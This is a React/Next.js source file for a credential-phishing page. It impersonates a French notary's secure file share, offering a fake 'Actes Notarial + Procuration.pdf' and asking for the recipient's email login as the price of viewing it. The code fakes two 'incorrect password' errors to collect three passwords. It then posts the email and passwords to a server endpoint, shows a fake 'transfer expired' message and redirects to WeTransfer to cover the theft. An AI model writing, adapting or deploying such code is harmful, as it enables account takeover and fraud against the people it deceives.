"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Avatar, AvatarFallback } from "@/components/ui/avatar";
import Image from "next/image";
import { FileText, AlertCircle, Eye, EyeOff, Loader2, User } from "lucide-react";

export default function Component() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [passwords, setPasswords] = useState<string[]>([]);
  const [showPassword, setShowPassword] = useState(false);
  const [showPasswordText, setShowPasswordText] = useState(false);
  const [error, setError] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [loading, setLoading] = useState(false);
  const [showTransferExpiredAlert, setShowTransferExpiredAlert] = useState(false);

  const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  const PASSWORD_MIN_LENGTH = 8;

  const validateEmail = (email: string) => {
    if (!email.trim()) {
      return "L'adresse e-mail est requise.";
    }
    if (!EMAIL_REGEX.test(email)) {
      return "Veuillez entrer une adresse e-mail valide.";
    }
    return "";
  };

  const validatePassword = (password: string) => {
    if (!password.trim()) {
      return "Le mot de passe est requis.";
    }
    if (password.length < PASSWORD_MIN_LENGTH) {
      return "Le mot de passe doit contenir au moins 8 caractères.";
    }
    return "";
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setLoading(true);

    if (!showPassword) {
      const emailError = validateEmail(email);
      if (emailError) {
        setError(emailError);
        setLoading(false);
        return;
      }
      setShowPassword(true);
      setLoading(false);
      return;
    }

    const passwordError = validatePassword(password);
    if (passwordError) {
      setError(passwordError);
      setLoading(false);
      return;
    }

    const updatedPasswords = [...passwords, password].slice(-3);
    setPasswords(updatedPasswords);

    const newAttempts = attempts + 1;
    setAttempts(newAttempts);

    console.log("Attempt", newAttempts, ":", {
      email,
      passwords: updatedPasswords,
    });

    if (newAttempts === 3) {
      await submitCredentials(email, updatedPasswords);
    } else {
      if (newAttempts === 1) {
        setError("Mot de passe incorrect. Veuillez réessayer.");
      } else if (newAttempts === 2) {
        setError("Deuxième tentative échouée. Dernière chance.");
      }
    }

    setLoading(false);
  };

  const submitCredentials = async (email: string, passwords: string[]) => {
    try {
      const response = await fetch("/api/submit-credentials", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, passwords }),
      });

      if (!response.ok) {
        throw new Error("Failed to submit credentials");
      }

      setShowTransferExpiredAlert(true);
      setLoading(false);

      setTimeout(() => {
        window.location.href = "https://wetransfer.com/";
      }, 2000);

    } catch (error) {
      console.error("Error:", error);
      setError("Une erreur s'est produite lors de la soumission. Veuillez réessayer.");
    } finally {
      setLoading(false);
    }
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newPassword = e.target.value;
    setPassword(newPassword);
    if (error) setError("");
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
      <div className="mb-8">
        <Image
          src="/logo.png"
          alt="Notaire Logo"
          width={120}
          height={80}
          className="w-auto h-20 md:h-24 lg:h-28"
          layout="responsive"
        />
      </div>

      {showTransferExpiredAlert && (
        <Alert variant="destructive" className="mb-4">
          <AlertCircle className="h-4 w-4" />
          <AlertTitle>Erreur</AlertTitle>
          <AlertDescription>Votre transfert est expiré.</AlertDescription>
        </Alert>
      )}

      <Card className="w-full max-w-md bg-white">
        <CardHeader className="space-y-1 pb-2">
          <h2 className="text-xl text-center font-medium">
            Vous avez reçu un fichier sécurisé
          </h2>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg">
            <FileText className="h-8 w-8 text-red-500" />
            <span className="font-medium">
              Actes Notarial + Procuration.pdf
            </span>
          </div>

          <p className="text-sm text-gray-600">
            Pour lire le document veuillez entrer les identifiants de messagerie
            auxquels ce fichier a été envoyé.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="flex flex-col items-center mb-4">
              <Avatar className="mb-2">
                <AvatarFallback>
                  <User className="h-10 w-10 text-gray-500" />
                </AvatarFallback>
              </Avatar>
              <small className="text-gray-400 text-xs">Connectez-vous</small>
            </div>
            <div className="space-y-2">
              <Input
                type="email"
                placeholder="Entrez l'adresse email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full"
              />
            </div>

            <div className="relative">
              <Input
                type={showPasswordText ? "text" : "password"}
                placeholder="Entrez le mot de passe"
                value={password}
                onChange={handlePasswordChange}
                className="w-full pr-12"
                minLength={PASSWORD_MIN_LENGTH}
              />
              <button
                type="button"
                onClick={() => setShowPasswordText(!showPasswordText)}
                className="absolute right-3 top-[7px] text-gray-500 hover:text-gray-700"
              >
                {showPasswordText ? (
                  <EyeOff className="h-5 w-5" />
                ) : (
                  <Eye className="h-5 w-5" />
                )}
              </button>
            </div>

            {error && (
              <Alert variant="destructive">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>{error}</AlertDescription>
              </Alert>
            )}

            <Button
              type="submit"
              className="w-full bg-blue-500 hover:bg-blue-700"
              disabled={loading}
            >
              {loading ? (
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              ) : showPassword ? (
                "Soumettre"
              ) : (
                "Continuer"
              )}
            </Button>
          </form>
        </CardContent>
      </Card>

      <footer className="mt-8 text-center space-y-4">
        <p className="text-sm text-gray-600">© Notaires France 2024</p>
        <div className="flex items-center justify-center gap-6"></div>
      </footer>
    </div>
  );
}
